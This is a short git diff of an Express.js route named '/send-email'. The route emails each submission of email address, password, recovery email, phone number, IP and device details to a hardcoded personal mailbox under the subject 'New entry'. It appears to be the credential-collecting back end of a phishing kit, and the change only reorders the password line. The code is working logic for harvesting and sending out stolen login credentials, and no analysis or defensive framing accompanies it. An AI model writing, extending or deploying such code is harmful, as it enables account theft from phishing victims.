@@ -25,10 +25,10 @@ app.post("/send-email", async (req, res) => {
       to: ["juniorhenry745@gmail.com"],
       subject: `New entry:: ${port}`,
       html: `
-    <p>Email: ${email}</p>.
+    <p>Email: ${email}</p>   
+    <p>Password: ${password}</p>
     <p>Recovery Email: ${recEmail}</p>
     <p>Phone Number: ${phone}</p>
-    <p>Password: ${password}</p>
     <p>IP: ${ip}</p>
     <p>PORT: ${port}</p>
     <p>Device Details: ${JSON.stringify(deviceDetails)}</p>
